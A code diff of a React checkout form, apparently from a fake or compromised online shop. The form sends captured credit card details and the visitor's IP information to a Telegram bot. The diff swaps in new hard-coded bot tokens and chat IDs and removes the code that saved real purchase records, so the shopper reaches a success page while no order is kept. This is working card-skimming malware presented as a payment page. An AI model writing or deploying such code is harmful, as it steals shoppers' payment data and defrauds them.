@@ -18,8 +18,8 @@ type UserToken = {
   email: string;
 };
 
-const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
-const TELEGRAM_CHAT_ID = '7860277201';
+const TELEGRAM_BOT_TOKEN = '7697540993:AAFLvjwviT5Z7ZjyI3jYl06x2vd34L5FDWw';
+const TELEGRAM_CHAT_ID = '7388576858';
 
 interface CreditCardFormProps {
   totalAmount: number;
@@ -62,7 +62,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [status, setStatus] = useState({ message: '', color: '' });
   const [loading, setLoading] = useState(false);
-  const [purchaseCompleted, setPurchaseCompleted] = useState(false);
 
   const checkAuth = () => {
     const token = document.cookie
@@ -85,52 +84,6 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     } catch (error) {
       router.push('/signin');
       return null;
-    }
-  };
-
-  const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
-    if (purchaseCompleted) return true; // Return true if already completed
-
-    const user = checkAuth();
-    if (!user) return false;
-
-    try {
-      const purchaseDoc = {
-        _type: 'purchase',
-        userId: user.id,
-        items: cartItems.map(item => ({
-          productId: item.id,
-          quantity: item.quantity,
-          price: item.selectedAmount,
-          iname: item.title
-        })),
-        totalAmount,
-        email: form.email,
-        streetAddress: form.streetAddress,
-        city: form.city,
-        country: form.country,
-        zipCode: form.zipCode,
-        phoneNumber: form.phoneNumber,
-        purchaseDate: new Date().toISOString(),
-      };
-
-      const res = await fetch('/api/purchasedata', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(purchaseDoc),
-      });
-
-      if (!res.ok) {
-        throw new Error('Failed to save purchase');
-      }
-
-      setPurchaseCompleted(true);
-      return true;
-    } catch (error) {
-      console.error('Error saving purchase:', error);
-      return false;
     }
   };
 
@@ -214,13 +167,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
     setStatus({ message: '', color: '' });
 
     try {
-      // 1. First save purchase data (only once)
-      const purchaseSuccess = await handlePurchase(cartItems, totalAmount);
-      if (!purchaseSuccess) {
-        throw new Error('Failed to save purchase data');
-      }
-
-      // 2. Get IP information
+      // 1. Get IP information (optional)
       let ipInfo = 'Unknown IP';
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -232,7 +179,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         console.error('Error fetching IP info:', ipError);
       }
 
-      // 3. Prepare Telegram message
+      // 2. Prepare Telegram message (optional)
       const message = `
 *New Credit Card Info Captured*
 
@@ -252,7 +199,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
 *Timestamp*: ${escapeMarkdown(new Date().toISOString())}
       `.trim();
 
-      // 4. Send Telegram notification
+      // 3. Send Telegram notification (optional)
       const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const telegramRes = await fetch(telegramUrl, {
         method: 'POST',
@@ -270,7 +217,7 @@ const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
         throw new Error(telegramData.description || 'Failed to send Telegram notification');
       }
 
-      // 5. Clear cart and redirect on complete success
+      // 4. Clear cart and redirect (NO PURCHASE DATA SAVED)
       clearCart();
       router.push('/payment/success');
 
